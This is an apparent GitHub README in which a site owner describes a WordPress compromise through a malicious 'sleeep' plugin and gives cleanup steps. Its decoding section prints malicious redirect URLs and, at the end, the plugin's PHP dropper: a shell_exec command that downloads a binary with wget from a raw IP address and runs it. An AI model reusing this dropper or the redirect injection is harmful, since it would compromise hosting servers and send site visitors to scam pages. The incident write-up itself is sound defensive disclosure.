# sleeep Hack Wordpress
I noticed yesterday that my friend's Wordpress was hacked. At least a wp-plugin called **sleeep** was installed and redirects to scam sites like transandfiestas were set. But before the visitors were hijacked, I saw an error similar to: `wp-sleeeps/wp-sleeeps.php on line 26`

I could not find a lot of information about this incident, that's why I just write down what I found out so far and it might help others. 

Discussion started here:
https://github.com/kn1g/sleeepHackWordpress/issues/1

Information to a similar attack seems to be found here:
https://txnkaro.com/blog/how-to-clean-js-donatelloflowfirstly-ga-virus-from-wordpress-site/

## Incident response

In general do the following:

1. Prevent further damage and take the page offline
1. Clean your files
1. Clean your database
1. Contact the hoster to get rid of eventually running malware on the host system
1. Change ALL passwords (FTP,Database, Wordpress and any other) to a new secure password

What I did explicitly (so far):

1. Bring the site down! Prevent that visitors are hijacked from your website! I simply logged into the hoster account and changed the DB (Data Base) password as this needs to be done anyway. The site will then be unavailable because of an DB error from Wordpress. But you can also use a password protection etc.
1. Download your database dump 
1. Check the `siteurl` and `home` values in your `_option` table 
1. Search for these values if they are not your website domain. In my case it was something with `transandfiestas`. I found a couple of blog entires with js script insertions. 
1. Delete all insertions. In my case I just searched for the `<script ... src='https://transandfiestas...</script>'` part and deleted it by replacing it with nothing.
1. Change the `siteurl` and `home` values back to your website url
1. Log into yout FTP account account and delete the sleep plugin in `wp-content/plugins/` (or similar. I always confuse the fildernames)

That is all I did until now. I need to check tomorrow if I need to do more. It is just too late now. Let me know if you know about more broken stuff.

## Please read

**THIS MIGHT NOT BE ENOGUH**!!! Please read:
https://github.com/kn1g/sleeepHackWordpress/issues/1

As pointed out in the discussion, there might be malware still running in memory on the infected host machine! You might need to contact your provider.
At least I did.

## What the attack does

It seems like it installs a malicious plugin (sleeep), it infects the database, it puts malicious files on your server and downloads a code which runs in memory on the host machine.


I didn't have time to write it up properly. Will do. Promised. I also didn't clean up properly yet.


## Random stuff

I decoded parts of the malicious files to see what they do. Which is this shit:
```
function my_simple_js() {
echo '<script type="text/javascript" src="'.chr(104).
```

These were the `int` in the malicious plugin file and the malicious `lte_` file

```
104 116 116 112 115 58 47 47 102 116 112 46 108 111 118 101 103 114 101 101 110 112 101 110 99 105 108 115 46 103 97 47 68 67 72 70 98 104 99 100 63 102 114 109 53 102 101 52 98 99 98 57 98 49 99 57 98 61 115 99 114 105 112 116 53 102 101 52 98 99 98 57 98 49 99 57 99 38 95 99 105 100 61 56 52 49 50 101 56 56 48 45 100 49 100 101 45 57 99 57 98 45 101 99 52 100 45 98 102 54 49 48 54 57 50 56 101 56 97
```
which is:
```
https://ftp.lovegreenpencils.ga/DCHFbhcd?frm5fe4bcb9b1c9b=script5fe4bcb9b1c9c&_cid=8412e880-d1de-9c9b-ec4d-bf6106928e8a
```
```
54 52 95 100 101 99 
```
is simply
```
64_dec

```
```
104 116 116 112 115 58 47 47 102 116 112 46 108 111 118 101 103 114 101 101 110 112 101 110 99 105 108 115 46 103 97 47 109 119 114 120 118 122 63 115 101 95 114 101 102 101 114 114 101 114 61
```
which decodes to:
```
https://ftp.lovegreenpencils.ga/mwrxvz?se_referrer=
```
```
103 101 116 95 99 111 110 116 101 110 116 115
```
is:
```
get_contents
```

```
110 117 108 108 38 115 111 117 114 99 101 61 104 116 116 112 58 47 47
```
equals
```
null&source=http://
```
```
112 97 103 101 110 111 116 102 111 117 117 117 110 100 
```
sounds found but is
```
pagenotfouuund
```

The `lte_` file has the malicious script which might bring malware into your host machine's memory which is:

```
<?php $a = 'ulimit -n 234234;cd /tmp;mkdir oyuiuyio2;chmod 777 oyuiuyio2;cd oyuiuyio2;rm -f oyuiuyio2;wget -O oyuiuyio2 http://95.181.172.35/7767/oyuiuyio;chmod 777 oyuiuyio2;./oyuiuyio2 2>&1 > /dev/null';shell_exec($a);
```


